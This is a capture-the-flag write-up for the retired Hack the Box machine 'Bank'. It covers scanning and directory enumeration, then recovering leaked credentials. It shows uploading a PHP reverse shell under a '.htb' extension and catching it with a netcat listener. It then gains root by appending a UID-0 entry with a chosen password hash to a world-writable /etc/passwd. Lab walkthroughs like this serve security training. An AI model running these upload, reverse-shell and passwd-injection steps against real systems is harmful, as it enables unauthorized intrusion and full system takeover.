This is how I approached the retired box 'Bank' from [Hack the box](https://www.hackthebox.eu/).

The box IP I'll be using throughout the article is *10.129.90.64*.

Scanning - NMap
---------------

The first step I usually take is to do a [TCP SYN](https://nmap.org/book/synscan.html) scan of the box. 

During the TCP SYN scan, NMap begins by sending a SYN packet. If a SYN/ACK packet is returned, it means that a port is open. Instead of finishing the TCP handshake with an ACK packet, a RST packet is returned instead. This means that no connection is started with the box, and therefore no additional exchanges are needed to close it. This makes the TCP SYN scan fast.

```bash
$ sudo nmap -sS  10.129.90.64                                                      

Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-31 11:29 EST
Nmap scan report for 10.129.90.64
Host is up (0.020s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

Webserver
---------

The NMap scan showed that there is a webserver running on port 80. Navigating to [http://10.129.90.64]() with the browser shows an Ubuntu Apache2 default page.

This is not very interesting.

However, there can be multiple websites running on a single server, via [virtual hosts](https://httpd.apache.org/docs/2.4/vhosts/name-based.html). This means that different hostnames can resolve to the same IP address and the server relies on the client to specify the hostname as part of the HTTP headers. 
In this way, when a request comes in, the server will try to find the best matching virtualhost configured. If no hostname is specified, then the first virtualhost configured will be returned by default (in our case, the default Apache page).

<!-- The DNS server needs to be configured so that it maps all hostnames to the same IP address.

NMap can perform reverse-DNS lookup, where it resolves the domain name for the IP address. This can be done with a list scan: -->
With a List scan, we can try to resolve the host name for the IP address:

```bash
$ nmap -sL 10.129.90.64  

Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 10:10 EST
Nmap scan report for bank.htb (10.129.29.200)
Nmap done: 1 IP address (0 hosts up) scanned in 0.01 seconds
```

We see that there is a domain name 'bank.htb'. Because there is no access to a DNS in Hack the Box, we need to add the hostname and its IP address to our `/etc/hosts` file:

```
127.0.0.1       localhost
127.0.1.1       kali
10.129.29.200  bank.htb # <==== Add this line!
```

Now we can navigate to [http://bank.htb]() in the browser, and we reach a login form.

## Enumeration

Now it's time to see if there are any interesting paths exposed! I did this with Gobuster and a medium size word list:

```bash
$ gobuster dir --url http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

===============================================================

===============================================================

```

Now we need to investigate these directories further. When navigating to [http://bank.htb/balance-transfer]() we see many files with size ~584 Kb. Opening a random file shows:

```bash

``` 

There are encrypted credentials. Sorting the files by size reveals that one file is much smaller than the others.

<p align="center"><img src="/images/bank/files.png" width="700"></p>

Opening this file shows plain-text credentials that failed to be encrypted. 

```

```

With the email and password, we can log in through the form at [http://bank.htb/login.php](). We arrive at a dashboard with information about credit cards and transactions. There is also a link in the menu for support ([http://bank.htb/support.php]()). Here there is a form to send a message, and it is possible to add file attachments.

If we look at the page source, we see a comment:

```html
<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
<a class='btn btn-primary' href='javascript:;'>
    Choose File...
    <input type="file" required style='position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0;background-color:transparent;color:transparent;' name="fileToUpload" size="40"  onchange='$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'>
</a>
```

We can try to add a php file that will open a reverse shell and give it a `.htb` extension. Earlier, when enumerating, we saw that there is an 'uploads' directory. We can hope that our uploaded file will be available there.

I usually use [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) php reverse shell. Lines 49 and 50 need to be modified with the correct IP address and port on which we will be listening for a connection. The IP address can be found in the Hack the Box 'Access' page, while the port can be anything. Ports below 1024 require root privileges, so I picked port 4444. I saved this file as `letstrythis.htb` and uploaded it with the form. The upload was successful.

Before navigating to [http://bank.htb/uploads/letstrythis.htb](), I started a listener on port 4444 in my Kali machine with netcat:

```bash
$ nc -l -p 4444
```

Now that we are ready to receive an incoming connection from the server, we can navigate to [http://bank.htb/uploads/letstrythis.htb]() with the browser. This gives us a shell! 

```bash
$ nc -l -p 4444

Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux

$ 
```

We are logged in as `www-data`. We need to find the `user.txt` to get the user flag. This is usually in one of the directories inside `/home`. In this case there is only `/home/chris`, and the file `user.txt` is in there.

## Privilege escalation

Now we need to find some vulnerability to exploit in order to gain root privileges. A nice check-list for what to try is [this](https://academy.hackthebox.eu/course/preview/linux-privilege-escalation/introduction-to-linux-privilege-escalation) one. In this case, looking for writeable files is interesting:

```bash
$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/proc
/tmp/socat
/etc/passwd
/sys/kernel/security/apparmor/policy/.remove
/sys/kernel/security/apparmor/policy/.replace
/sys/kernel/security/apparmor/policy/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.ns_name
/sys/kernel/security/apparmor/.ns_level
/sys/kernel/security/apparmor/.ns_stacked
/sys/kernel/security/apparmor/.stacked
/sys/kernel/security/apparmor/.access
```

The file `/etc/passwd` should not be writeable in a properly configured system. The `/etc/passwd` file on the server looks as follows:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
chris:x:1000:1000:chris,,,:/home/chris:/bin/bash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
bind:x:105:112::/var/cache/bind:/bin/false
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
```

Each line gives information about a different user in the system. For example, for `chris`, we can learn that:

| Username | Encrypted password | User ID | Group ID | Additional Info | Home directory | Default Shell |
| :------- | :----------------: | :-----: | :------: | :-------------: | :------------: | ------------: |
|  chris   | x   				| 1000    | 1000	 | chris		   | /home/chris    | /bin/bash     |

For more details about the `/etc/passwd` file, you can see this tutorial [here](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/). 

Nowadays, the encrypted passwords are actually kept in the `/etc/shadow` file. Any user that has a password configured then has an `x` in the second coloumn of the `/etc/passwd` file. However, for backwards compatibility reasons, if there is an encrypted password in the second coloumn of the `/etc/passwd` file it takes precedence over the one in the `/etc/shadow`. Therefore, by modifying the `/etc/passwd` file we can add a new user with credentials that we can choose.

Another important detail is that users are identified by their user ID and not by their name. Multiple entries with different names but same user ID are allowed. We can add an entry in the `/etc/passwd` file with a username different than `root` but still with user ID `0`. This will not create a new user, but only another set of credentials that can be used to log in as the user with User ID = 0. 

To generate an encrypted password, we can use:

```bash
$ perl -le 'print crypt("foo", "aa")'

aaKNIEDOaueR6
``` 

The parameter `foo` is the password we want to encrypt, while `aa` is the salt. Then, we can append a line to the end of the `/etc/passwd` with the following command:

```bash
$ echo root2:aaKNIEDOaueR6:0:0:root:/root:/bin/bash >> /etc/passwd
```

Note that we modified the username to be `root2`, so that we can use the username/password combination `root2`/`foo` to log in with User ID = 0.

Before being able to use the command `su` and log in as `root2`, we need to [upgrade our shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). In this case, python is installed on the server, so we can run:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'

www-data@bank:/$
```

The prompt changes and we can see the name of the user and the hostname. Now, we can log in as root2:

```bash
www-data@bank:/$ su root2

su root2
Password: foo

root@bank:/#
```

Now that we have gained root privileges, we can see the content of the file `/root/root.txt`!
